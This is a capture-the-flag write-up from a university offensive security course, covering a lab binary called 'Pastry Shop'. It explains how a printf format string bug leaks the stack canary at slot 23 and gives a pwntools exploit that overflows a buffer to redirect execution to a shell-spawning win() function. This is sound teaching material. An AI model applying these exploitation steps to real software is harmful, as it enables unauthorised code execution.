# Pastry Shop

**Category:** pwn / format string leak + canary bypass · **Course:** Offensive Security (PoliTo)

## Challenge

Two bugs in one binary: `greet()` does `printf(name)` on unsanitised user input (a format string bug), and `vuln()` then reads into a canary-protected 64-byte buffer. A `win()` function that spawns `/bin/sh` exists but is never called.

## Vulnerability

1. **Format string:** `printf(name)` instead of `printf("%s", name)` lets us read arbitrary stack slots with `%N$lx`.
2. **Stack canary bypass:** the binary is built with the stack protector on, so a straight overflow trips `__stack_chk_fail`. Instead of brute-forcing the canary, the format string bug is reused to *leak* it directly — stack position **23** lines up with the canary value.

## Exploitation

1. At the name prompt, send `%23$lx` to leak the canary as a hex string. (The index was found by first sending `AAAA.%lx.%lx.%lx...` and counting to the slot holding the canary.)
2. Build the overflow in the order prompt: **72 bytes** of padding up to the canary, the leaked canary value so the epilogue's check passes, **8 bytes** of saved-RBP filler (offset to saved RIP is 88), then the address of `win()`.

As in `solve.py`:

```python
CANARY_IDX       = 23
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88

p.sendline(f"%{CANARY_IDX}$lx".encode())     # leak the canary via printf(name)
canary = int(p.recvline().strip(), 16)

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(elf.sym.win),
)
```

## Files

- `main.c` — challenge source
- `Makefile` — build recipe (`-fstack-protector-all -no-pie -O0 -g`: canary enabled, fixed load address)
- `pastry_shop` — compiled challenge binary
- `solve.py` — working exploit (pwntools)

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
